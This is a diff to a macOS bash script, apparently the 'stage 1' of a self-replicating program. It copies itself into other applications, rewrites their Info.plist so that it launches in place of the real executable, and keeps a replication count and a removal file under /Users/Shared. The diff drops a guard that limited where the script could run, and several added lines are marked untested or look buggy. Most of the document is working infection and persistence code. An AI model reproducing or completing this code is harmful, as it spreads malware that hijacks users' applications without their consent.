@@ -4,13 +4,11 @@
 DEBUG=1
 #LOGGING isn't dependent anymore on DEBUG being enabled (1)
 LOGGING=1
-#Do not run this script in /Users/Shared/ with LOGGING enabled, as 
-#the logging would mess with the log for removal.sh
 OrigPath=$(pwd)
 TryCount=1
 Path=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
 cd "${Path}"
-if [ ${LOGGING} == 1 ] && [ ${Path} != "/Users/Shared" ]
+if [ ${LOGGING} == 1 ]
 then
 	if [ -f ./.stage-1.log ]
 	then
@@ -29,13 +27,6 @@ then
 		echo "Replication count: 0" >> ./.stage-1.log
 		echo "" >> ./.stage-1.log
 	fi
-else
-	if [ ${DEBUG} == 1 ]
-	then
-		echo "Unable to run in ${Path} with LOGGING set to ${LOGGING}"
-		echo "This is to protect the integrity of the log used for removal of stage 1"
-	fi
-	exit 0
 fi
 #The $0 in $Script prints the script name, except it starts with ./
 #The solution for this is to add a forward slash right before it.
@@ -167,35 +158,34 @@ do
 		IsReadablePlist="true"
 	fi
 done
-#Check for stage 1 log/info file (/Users/Shared/.stage-1.log)
+#Check for stage 1 removal file (/Users/Shared/.stage-1.sh)
 #This location was chosen because all other non-commonly-visited [but always
 #present] directories [other than /private/tmp/, but that's temporary] require
 #sudo/root perms)
-#./.stage-1.log is for script logging, and /Users/Shared/.stage-1.log is for
-#being read by removal.sh
-if [ -f /Users/Shared/.stage-1.log ]
+if [ -f /Users/Shared/.stage-1.sh ]
 then
 	if [ ${DEBUG} == 1 ]
 	then
-		echo "/Users/Shared/.stage-1.log present"
+		echo "/Users/Shared/.stage-1.sh present"
 	fi
 	if [ ${LOGGING} == 1 ]
 	then
-		echo "/Users/Shared/.stage-1.log present" >> ./.stage-1.log
+		echo "/Users/Shared/.stage-1.sh present" >> ./.stage-1.log
 	fi
 else
-	touch "/Users/Shared/.stage-1.log"
-	echo "Replicated 0 times" >> "/Users/Shared/.stage-1.log"
-	echo "" >> "/Users/Shared/.stage-1.log"
+	touch "/Users/Shared/.stage-1.sh"
+	echo "#!/bin/bash"
+	echo "#Replication count: 0" >> "/Users/Shared/.stage-1.sh"
+	echo "" >> "/Users/Shared/.stage-1.sh"
 	if [ ${DEBUG} == 1 ]
 	then
-		echo "/Users/Shared/.stage-1.log not present"
-		echo "/Users/Shared/.stage-1.log created"
+		echo "/Users/Shared/.stage-1.sh not present"
+		echo "/Users/Shared/.stage-1.sh created"
 	fi
 	if [ ${LOGGING} == 1 ]
 	then
-		echo "/Users/Shared/.stage-1.log not present" >> ./.stage-1.log
-		echo "/Users/Shared/.stage-1.log created" >> ./.stage-1.log
+		echo "/Users/Shared/.stage-1.sh not present" >> ./.stage-1.log
+		echo "/Users/Shared/.stage-1.sh created" >> ./.stage-1.log
 	fi
 fi
 #Copy this script over to target
@@ -223,10 +213,10 @@ then
 	sed -i '' -e '$ d' "${TScript}"
 	echo "./${ExecName}" >> "${TScript}"
 	#Add TScript to the log for removal:
-	echo "${TScript}" >> "/Users/Shared/.stage-1.log"
-	#Edit target's info.plist (create backup)(to remove):
-	#Doesn't seem to work:
-	sed -i '.BAK' "${ExecLineNum}s/${ExecName}\$/.${ExecName}/" "${TargetPlist}"
+	echo "${TScript}" >> "/Users/Shared/.stage-1.sh"
+	#Edit target's info.plist:
+	#Need to test if the following line works, if not try adding a \$ after the first ${ExecName}
+	sed -i '' "${ExecLineNum}s/${ExecName}/.${ExecName}/" "${TargetPlist}"
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "${TargetPlist} edited"
@@ -235,7 +225,6 @@ then
 	then
 		echo "${TargetPlist} edited" >> ./.stage-1.log
 	fi
-	SuccessfulEdit="false"
 	NewExecLineFull=$(sed -n "${ExecLineNum}p" "${TargetPlist}")
 	echo "${NewExecLineFull}" >> "/private/tmp/${TmpName}"
 	if [ ${DEBUG} == 1 ]
@@ -251,7 +240,7 @@ then
 	#For some reason the -E (not -e) is necessary here:
 	NewExecName=$(sed -nE "/<string>/ s/.*<string>([^<]+).*/\1/p" "/private/tmp/${TmpName}")
 	#Write the NewExecName to the log for removal
-	echo "${NewExecName}" >> "/Users/Shared/.stage-1.log"
+	echo "${NewExecName}" >> "/Users/Shared/.stage-1.sh"
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "NewExecName is ${NewExecName}"
@@ -280,22 +269,34 @@ then
 		SuccessfulReplication="true"
 	else
 		SuccessfulReplication="false"
+		rm "${TScript}"
 	fi
 	if [ ${DEBUG} == 1 ]
 	then
 		echo "SuccessfulReplication == ${SuccessfulReplication}"
+		if [ ! -f "${TScript}" ]
+		then
+			echo "TScript has been removed, or wasn't moved in the first place"
+		fi
 	fi
 	if [ ${LOGGING} == 1 ]
 	then
 		echo "SuccessfulReplication == ${SuccessfulReplication}" >> ./.stage-1.log
+		if [ ! -f "${TScript}" ]
+		then
+			echo "TScript has been removed, or wasn't moved in the first place" >> ./.stage-1.log
+		fi
 	fi
 fi
 if [ ${SuccessfulCopy} == "true" ] && [ ${SuccessfulReplication} == "true" ]
 then
-	RC03=$(sed -n "s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" "/Users/Shared/.stage-1.log")
+	RC03=$(sed -n "2!d;s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" "/Users/Shared/.stage-1.sh")
 	RC04=${RC03}
 	let "REPC04++"
-	sed -i '' "1s/${RC03}\$/${RC04}/" "/Users/Shared/.stage-1.log"
+	sed -i '' "2s/${RC03}\$/${RC04}/" "/Users/Shared/.stage-1.sh"
+	echo "rm ${TScript}" >> "/Users/Shared/.stage-1.sh"
+	#Test this line, if it doesn't work see line 218 for what to try:
+	echo "sed -i '' '${ExecLineNum}s/${NewExecName}/${ExecName}/' '${TargetPlist}'"
 	if [ ${LOGGING} == 1 ]
 	then
 		RC05=$(sed -n "2!d;s/\(.*[^0-9]\)\([0-9]*\)$/\2/p;q" ./.stage-1.log)
